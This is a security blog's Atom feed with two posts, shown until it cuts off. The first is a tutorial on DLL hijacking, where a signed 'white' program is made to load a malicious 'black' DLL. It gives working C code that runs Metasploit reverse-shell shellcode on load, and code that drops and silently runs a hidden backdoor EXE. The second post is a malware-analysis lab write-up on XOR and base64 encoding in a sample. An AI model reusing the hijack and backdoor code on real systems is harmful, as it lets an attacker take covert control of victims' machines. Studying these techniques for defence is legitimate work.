<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ackie&#39;blog</title>
  
  
  <link href="https://b1ackie.cn/atom.xml" rel="self"/>
  
  <link href="https://b1ackie.cn/"/>
  <updated>2021-10-12T09:14:11.235Z</updated>
  <id>https://b1ackie.cn/</id>
  
  <author>
    <name>b1ackie</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>“白加黑”DLL劫持</title>
    <link href="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/"/>
    <id>https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/</id>
    <published>2021-10-11T08:50:39.000Z</published>
    <updated>2021-10-12T09:14:11.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑“的DLL。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>DLL劫持的原理主要就是windows下加载DLL的顺序。在加载DLL的时候，系统会依次从以下六个位置去查找所需要的DLL文件</p><ol><li>程序所在目录</li><li>系统目录</li><li>16位系统目录</li><li>Windows目录</li><li>当前目录</li><li>PATH环境变量中的各个目录</li></ol><p>只要可以将准备好的DLL放在特定的目录下，先于原先的DLL被加载，就会实现劫持。</p><p>不过在win7之后，微软为了防御DLL劫持，将一些容易被劫持的DLL写入了一个注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs，在这里的DLL都会被禁止从程序所在目录下调用，只可以在系统目录下调用。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.png"></p><h2 id="一些要求"><a href="#一些要求" class="headerlink" title="一些要求"></a>一些要求</h2><p>要实现“白加黑”的话，DLL最好是有很少的导出函数，或是对于一个白应用来说不是必需的DLL，没有此DLL还是可以打开程序正常运行，这样的话都不需要进行函数的转发。白应用调用的自己编写的DLL最好也比较少，这样更加方便。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>在这里可以使用工具来进行查找，使用Process Monitor工具。</p><p>根据刚才所讲，那么我们理清一下思路，现在需要找到一个可以使用的DLL，那么将某个白应用放在一个目录下，然后使用工具观察其加载DLL的情况，如果它尝试从当前目录下去加载某个DLL，那么可以尝试构造同名DLL来进行劫持。</p><p>在Process Monitor中设置一些过滤条件</p><blockquote><p><strong>Include</strong></p><p>Operation is CreateFile</p><p>Operation is LoadImage</p><p>Path contains .dll</p><p><strong>Exclude</strong></p><p>Result is SUCCESS</p></blockquote><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.png"></p><p>这里我随便在网上找了一个某播放器的安装包，是一个带数字签名的白应用，其次这个安装包也不带任何DLL。可以看到在启动它的时候，尝试在我这个123目录下寻找几个DLL，那么可以尝试伪造一下。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/3.png"></p><p>写一个弹计算器的DLL，然后改名为SHFOLDER.dll，具体哪个DLL名字可以用，还需要去实际测试，我试第一个VERSION并不可行，用这个是可以的。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_NORMAL);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>点击运行一下查看效果，成功弹出了计算机。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.gif"></p><p>然后在测试的时候，后台的浏览器一直是开着的，查看Process Monitor的时候，发现了一个浏览器的更新程序也在寻找一个DLL，这个也可以拿来利用， 并且这个程序很小，只有一百五十多KB。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/4.png"></p><p>现在来尝试一下利用MSF生成一个远控木马，来操作下。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/5.png"></p><p>然后把它写进DLL中，让DLL启动直接执行这段shellcode。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89\xe5&quot;</span><br><span class="hljs-string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br><span class="hljs-string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span><br><span class="hljs-string">&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span><br><span class="hljs-string">&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;</span><br><span class="hljs-string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span><br><span class="hljs-string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span><br><span class="hljs-string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span><br><span class="hljs-string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span><br><span class="hljs-string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span><br><span class="hljs-string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span><br><span class="hljs-string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span><br><span class="hljs-string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xca\x84\x68\x02&quot;</span><br><span class="hljs-string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span><br><span class="hljs-string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span><br><span class="hljs-string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span><br><span class="hljs-string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span><br><span class="hljs-string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span><br><span class="hljs-string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span><br><span class="hljs-string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    LPVOID Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>    ((<span class="hljs-keyword">void</span>(*)())Memory)();<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        run();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后在服务端开启监控，这个时候就出现了问题，这边好像是一直发包发不过去，就没办法了，我也不知道是哪里出问题了。但是我用一个EXE进行测试，发现是没有任何问题的，于是，我就想到不如把EXE放在DLL的资源节里，然后“白加黑”释放资源，再打开exe好了。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/6.png"></p><p>将shellcode编写成一个exe，然后把它放到DLL的资源节中，当加载DLL的时候释放此exe在运行它。</p><p>释放资源</p><p>释放资源这里，一定一定要注意DLL释放资源和EXE是不同的，FindResource这几个函数第一个参数千万不能是NULL，这里要是DLL的句柄，我在这卡了好久，才发现问题。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">Free</span><span class="hljs-params">(UINT uResourceId, WCHAR* szResourceType, <span class="hljs-keyword">char</span>* szFileName)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//如果是DLL的资源释放，必须加载DLL的句柄！！！！</span><br>HMODULE hDll = GetModuleHandle(<span class="hljs-string">L&quot;goopdate.dll&quot;</span>);<br><span class="hljs-comment">// 找到资源</span><br>HRSRC hRsrc = FindResource(hDll, MAKEINTRESOURCE(uResourceId), szResourceType);<span class="hljs-comment">//第一个参数不能是NULL，不然的话无法搜索到资源，其他同样</span><br><span class="hljs-keyword">if</span> (hRsrc == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取资源大小</span><br>DWORD dwSize = SizeofResource(hDll, hRsrc);<br><span class="hljs-keyword">if</span> (dwSize &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 载入资源</span><br>HGLOBAL hGlobal = LoadResource(hDll, hRsrc);<br><span class="hljs-keyword">if</span> (hGlobal == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 锁定资源，并返回指向资源第一字节的指针</span><br>LPVOID lpRes = LockResource(hGlobal);<br><span class="hljs-keyword">if</span> (lpRes == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//创建一个隐藏文件</span><br>HANDLE hFile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hFile == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>DWORD dwWriten = <span class="hljs-number">0</span>;<br>BOOL bRes = WriteFile(hFile, lpRes, dwSize, &amp;dwWriten, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (bRes == FALSE || dwWriten &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CloseHandle(hFile);<br>CloseHandle(hGlobal);<br>CloseHandle(hRsrc);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>启动进程</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">Create</span><span class="hljs-params">(WCHAR* szFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>STARTUPINFO si;<br>PROCESS_INFORMATION pi;<br><span class="hljs-built_in">ZeroMemory</span>(&amp;si, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si));<br><span class="hljs-built_in">ZeroMemory</span>(&amp;pi, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pi));<br>si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><span class="hljs-comment">//隐藏窗口启动释放的exe</span><br>BOOL flag = <span class="hljs-built_in">CreateProcess</span>(szFileName, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br><span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后编译，再改名为要劫持的DLL就可以了。</p><p>将DLL属性设置为隐藏，双击运行后，会释放出加载shellcode的exe，其属性也是隐藏，然后再执行，就成功上线了。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/7.png"></p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.gif"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不过暂时应该还是没有办法过杀软的，因为这个shellcode肯定是会被检测到的，不过免杀不在本篇考虑的范畴内。还有就是为什么加载shellcode的DLL不可以上线，暂时不知道为什么。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21">https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/20">https://security.tencent.com/index.php/blog/msg/20</a></p><p><a href="https://blog.csdn.net/mengyafei43/article/details/10340689">https://blog.csdn.net/mengyafei43/article/details/10340689</a></p><p><a href="https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑</summary>
      
    
    
    
    <category term="DLL劫持" scheme="https://b1ackie.cn/categories/DLL%E5%8A%AB%E6%8C%81/"/>
    
    
    <category term="DLL劫持" scheme="https://b1ackie.cn/tags/DLL%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验13</title>
    <link href="https://b1ackie.cn/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/"/>
    <id>https://b1ackie.cn/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/</id>
    <published>2021-10-08T07:15:15.000Z</published>
    <updated>2021-10-13T02:41:08.486Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-13-1"><a href="#Lab-13-1" class="headerlink" title="Lab 13-1"></a>Lab 13-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>监控行为可以看到有大量的网络连接</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/1.png"></p><p>使用wireshark抓取数据包，可以看到如图的数据包内容。可以看到域名<a href="http://www.practicalmalwareanalysis.com还有get字段的内容v0lolu5qtfe0se9t./">www.practicalmalwareanalysis.com还有get字段的内容V0lOLU5QTFE0SE9T。</a></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2.png"></p><p>使用IDA查看程序，可以看到有两个自定义的函数<code>sub_401300</code>，<code>sub_4011C9</code>。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/3.png"></p><p>来分析一下401300，可以看到从资源节中释放出来一些资源，然后调用<code>sub_401190</code>，分析此函数发现是一个与0x3B异或的过程。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/4.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/5.png"></p><p>资源节内容</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/6.png"></p><p>异或后的结果，可以看到正是访问的域名。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/7.png"></p><p>使用IDA FindCrypt插件可以看到此程序有base64</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/8.png"></p><p>找到地方发现正是第二个函数<code>sub_4011C9</code>之中。发现其进行编码的内容是通过gethostname函数获得的主机名。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/9.png"></p><p>base64过程</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/11.png"></p><p>查看编码后的内容正是get字段的内容。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/10.png"></p><p>继续分析后面的函数，可以看到会访问这个URL<a href="http://www.practicalmalwareanalysis.com/V0lOLU5QTFE0SE9T">www.practicalmalwareanalysis.com/V0lOLU5QTFE0SE9T</a> ，然后会调用InternetReadFile来读取返回的数据，如果返回的数据等于0x6F也就是o的话，那么返回值result就不等于0，就会终止外面的循环。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/15.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/16.png"></p><h3 id="1-比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？"><a href="#1-比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？" class="headerlink" title="1.比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？"></a>1.比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？</h3><p>查看字符串，可以看到base64所用码表，Mozilla/4.0，http://%s/%s，这几个。加密的话就是base64加密，加密元素从这里不太好分析出来。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/12.png"></p><h3 id="2-使用IDA-pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？"><a href="#2-使用IDA-pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？" class="headerlink" title="2.使用IDA pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？"></a>2.使用IDA pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？</h3><p>4011B8处是3B在进行异或，那么这里重点关注一下，跟进后就是前面分析的xor解密。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/13.png"></p><h3 id="3-恶意代码使用什么密钥加密，加密了什么内容？"><a href="#3-恶意代码使用什么密钥加密，加密了什么内容？" class="headerlink" title="3.恶意代码使用什么密钥加密，加密了什么内容？"></a>3.恶意代码使用什么密钥加密，加密了什么内容？</h3><p>使用的是base64加密，加密的是主机名</p><h3 id="4-使用静态工具FindCrypt2，Krypto-ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？"><a href="#4-使用静态工具FindCrypt2，Krypto-ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？" class="headerlink" title="4.使用静态工具FindCrypt2，Krypto ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？"></a>4.使用静态工具FindCrypt2，Krypto ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？</h3><p>可以发现base64加密</p><h3 id="5-什么类型的加密被恶意代码用来发送部分网络流量？"><a href="#5-什么类型的加密被恶意代码用来发送部分网络流量？" class="headerlink" title="5.什么类型的加密被恶意代码用来发送部分网络流量？"></a>5.什么类型的加密被恶意代码用来发送部分网络流量？</h3><p>base64加密</p><h3 id="6-Base64编码函数在反汇编的何处？"><a href="#6-Base64编码函数在反汇编的何处？" class="headerlink" title="6.Base64编码函数在反汇编的何处？"></a>6.Base64编码函数在反汇编的何处？</h3><p>在反汇编的401000处</p><h3 id="7-恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？"><a href="#7-恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？" class="headerlink" 